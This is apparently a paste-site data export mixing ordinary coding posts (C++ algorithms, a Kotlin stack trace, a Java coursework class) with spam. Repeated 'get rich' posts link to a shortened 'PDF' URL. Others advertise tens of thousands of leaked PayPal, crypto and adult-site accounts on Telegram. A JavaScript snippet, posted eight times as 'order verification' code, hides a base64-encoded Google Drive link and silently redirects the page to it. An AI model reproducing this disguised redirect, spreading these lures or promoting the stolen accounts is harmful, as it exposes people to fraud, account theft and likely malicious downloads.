id,title,username,language,date,content
4j0pEeyV,снм долгий,nq1s788,C++,Saturday 26th of April 2025 12:33:51 PM CDT,"#include <iostream>
#include <set>
#include <vector>
#include <deque>

#define se second
#define fi first
#define mp make_pair
#define pb push_back

using namespace std;

vector<int> p;

int get_root(int x) {
    if (p[x] == x) return x;
    return get_root(p[x]);
}

void unite(int x, int y) {
    x = get_root(x);
    y = get_root(y);
    p[x] = y;
}

bool check(int x, int y) {
    return get_root(x) == get_root(y);
}

int main() {
    int n, m;
    cin >> n >> m;
    p.resize(n);
    for (int i = 0; i < n; i++) p[i] = i;
    while (m--) {
        ///
    }
    return 0;
}
"
z7Ypg5Js,2025-04-26T20:30:55.524024,powerampache,PHP,Saturday 26th of April 2025 12:30:55 PM CDT,"1.01-80-free (80) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
asCuVPXc,Make $1000 15-MINUTES (BEGINNER) 96,covertbelli,JavaScript,Saturday 26th of April 2025 12:27:59 PM CDT," 
Pdf https://tinyurl.com/privguidee

rHgkOiIece
"
jFCrGXz3,Products.js,x2LeaF,JavaScript,Saturday 26th of April 2025 12:27:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00482/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VUppeDkq,Chaturbate with Tokens,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:19:22 PM CDT,73557 Accounts Posted On https://t.me/leakedbyem1nem
4jZTG2m8,EARN $900 INSTANTLY 2025⭐ NU,covertbelli,JavaScript,Saturday 26th of April 2025 12:18:41 PM CDT," 
Pdf https://tinyurl.com/privguidee

JnFP4qeNWG
"
BAY9sHb3,Order.js,x2LeaF,JavaScript,Saturday 26th of April 2025 12:12:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64671/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xKvHhc7Q,Make $1000 15-MINUTES  (BEGINNER) ME,covertbelli,JavaScript,Saturday 26th of April 2025 12:09:23 PM CDT," 
Pdf https://tinyurl.com/privguidee

U6bOPxynK6
"
a5mFrtdp,игра камни через рекурсию,nq1s788,C++,Saturday 26th of April 2025 12:04:50 PM CDT,"///https://informatics.msk.ru/mod/statements/view.php?id=298&chapterid=366#1

#include <iostream>
#include <set>
#include <vector>
#include <deque>

#define se second
#define fi first
#define mp make_pair
#define pb push_back

using namespace std;

vector<int> F;

int f(int n) {
    if (n <= 0) return 2;
    if (F[n] != 0) return F[n];
    vector<int> next;
    if (n % 3 == 0) {
        next = {n - 1, n - 2};
    } else if (n % 3 == 1) {
        next = {n - 1, n - 3};
    } else {
        next = {n - 1, n - 2, n - 3};
    }
    for (auto e : next) {
        if (f(e) == 2) {
            F[n] = 1;
            return 1;
        }
    }
    F[n] = 2;
    return 2;
}

int main() {
    int n;
    cin >> n;
    F.assign(n + 1, 0);
    cout << f(n);
    return 0;
}
"
WZK3wJcV,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:04:00 PM CDT,95775 Accounts Posted On https://t.me/leakedbyem1nem
Ung5xcGA,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 11:56:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04700/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
51qSWczc,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:48:38 AM CDT,68705 Accounts Posted On https://t.me/leakedbyem1nem
NqrqeCL5,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 11:41:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FNvKE73E,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:33:15 AM CDT,26114 Accounts Posted On https://t.me/leakedbyem1nem
d9GcX7Un,Products.js,x2LeaF,JavaScript,Saturday 26th of April 2025 11:26:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80324/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JDJ5bWiP,Chaturbate with Tokens,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:17:53 AM CDT,19275 Accounts Posted On https://t.me/leakedbyem1nem
3kHDbPJ2,Order.js,x2LeaF,JavaScript,Saturday 26th of April 2025 11:10:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15915/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
99Gb0yJN,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 26th of April 2025 11:02:31 AM CDT,10483 Accounts Posted On https://t.me/leakedbyem1nem
VNE7g16i,"[NP] Post, Comments & Likes",dzocesrce,Java,Saturday 26th of April 2025 10:59:44 AM CDT,"import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
class Comment implements Comparable<Comment> {

    String author;
    String id;
    String content;
    String replyToId;
    int likes;

    public int getLikes() {
        return likes;
    }

    public Comment(String author, String id, String content, String replyToId) {
        this.author = author;
        this.id = id;
        this.content = content;
        this.replyToId = replyToId;
        this.likes=0;
    }

    public Comment(String author, String id, String content) {
        this.author = author;
        this.id = id;
        this.content = content;
    }

    @Override
    public String toString() {
        StringBuilder  stringBuilder = new StringBuilder();
                stringBuilder.append(String.format(""        Comment: %s\n"" +
                ""        Written by: %s\n"" +
                ""        Likes: %d"",content,author,likes));
        return stringBuilder.toString();
    }

    @Override
    public int compareTo(Comment o) {
        return Comparator.comparing(Comment::getLikes).reversed().compare(this,o);
    }


    public void incrementLikes() {
        likes++;
    }
}

class Post {
    String postAuthor;
    String postContent;
    Map<String,Comment> comments;


    public Post(String postAuthor, String postContent) {
        this.comments = new HashMap<>();
        this.postAuthor = postAuthor;
        this.postContent = postContent;
    }

    public void addComment(String author, String id, String content, String replyToId) {
        if(replyToId==null)
            comments.putIfAbsent(id,new Comment(author,id,content));
        else{
            comments.putIfAbsent(id,new Comment(author,id,content,replyToId));
        }
    }

    public void likeComment(String id) {
        comments.get(id).incrementLikes();
    }


    @Override
    public String toString() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(String.format(""Post: %s\nWritten by: %s\nComments:\n"", postContent, postAuthor));

        comments.values().stream()
                .filter(c -> c.replyToId == null)
                .sorted() // ова е ново!!!
                .forEach(comment -> {
                    appendCommentWithReplies(comment, stringBuilder, 1);
                });

        return stringBuilder.toString().trim();
    }


    private void appendCommentWithReplies(Comment comment, StringBuilder sb, int indentLevel) {
        // Add indentation
        sb.append(""        "".repeat(indentLevel));
        sb.append(String.format(""Comment: %s\n"", comment.content));
        sb.append(""        "".repeat(indentLevel));
        sb.append(String.format(""Written by: %s\n"", comment.author));
        sb.append(""        "".repeat(indentLevel));
        sb.append(String.format(""Likes: %d\n"", comment.likes));

        // Find replies to this comment
        comments.values().stream()
                .filter(c -> comment.id.equals(c.replyToId))
                .sorted()
                .forEach(reply -> appendCommentWithReplies(reply, sb, indentLevel + 1));
    }
}

public class PostTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String postAuthor = sc.nextLine();
        String postContent = sc.nextLine();

        Post p = new Post(postAuthor, postContent);

        while (sc.hasNextLine()) {
            String line = sc.nextLine();
            String[] parts = line.split("";"");
            String testCase = parts[0];

            if (testCase.equals(""addComment"")) {
                String author = parts[1];
                String id = parts[2];
                String content = parts[3];
                String replyToId = null;
                if (parts.length == 5) {
                    replyToId = parts[4];
                }
                p.addComment(author, id, content, replyToId);
            } else if (testCase.equals(""likes"")) { //likes;1;2;3;4;1;1;1;1;1 example
                for (int i = 1; i < parts.length; i++) {
                    p.likeComment(parts[i]);
                }
            } else {
                System.out.println(p);
            }

        }
    }
}"
GJvG8f5C,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 10:55:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10357/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Wxh6T3fK,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 26th of April 2025 10:47:08 AM CDT,11179 Accounts Posted On https://t.me/leakedbyem1nem
sRX2uuTe,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 10:40:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20267/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
